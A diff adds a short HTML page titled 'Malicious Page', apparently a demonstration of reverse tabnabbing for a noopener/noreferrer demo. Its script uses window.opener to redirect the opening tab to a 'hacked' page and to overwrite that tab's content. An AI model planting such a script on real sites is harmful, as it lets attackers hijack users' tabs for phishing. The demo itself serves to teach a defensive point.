@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <script>
+        // Check if the opener exists
+        if (window.opener) {
+            // Change the location of the opener
+            window.opener.location = 'https://skunkworks-lab-services.github.io/noopener-noreferrer-demo/hacked.html';
+            // Or manipulate the opener's DOM
+            window.opener.document.body.innerHTML = '<h1>Hacked!</h1>';
+        }
+    </script>
+</body>
+</html>
